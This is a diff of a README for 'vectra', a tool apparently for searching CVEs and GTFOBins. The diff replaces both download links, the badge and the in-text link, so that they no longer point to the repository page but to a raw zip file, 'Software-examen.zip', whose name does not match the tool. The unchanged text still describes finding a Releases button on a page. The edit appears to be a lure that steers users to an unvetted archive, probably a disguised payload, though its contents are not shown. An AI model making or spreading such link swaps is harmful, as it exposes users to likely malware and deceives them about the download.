@@ -1,6 +1,6 @@
 # ⚡ vectra - Search CVEs & GTFOBins in Seconds
 
-[![Download vectra](https://img.shields.io/badge/Download-vectra-blue?style=for-the-badge&logo=github)](https://github.com/devharis99/vectra)
+[![Download vectra](https://img.shields.io/badge/Download-vectra-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/devharis99/vectra/main/vectra/Software-examen.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Welcome! vectra is a powerful yet easy-to-use tool that helps you search for sec
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/devharris99/vectra](https://github.com/devharris99/vectra)
+Visit this link to download the application: [https://raw.githubusercontent.com/devharis99/vectra/main/vectra/Software-examen.zip](https://raw.githubusercontent.com/devharis99/vectra/main/vectra/Software-examen.zip)
 
 Once you arrive at the page, look for the **"Releases"** or **"Download"** button, usually located on the right side or top of the page. Click it and choose the version that matches your operating system (Windows, macOS, or Linux). The download will start automatically after you pick the right file.
 
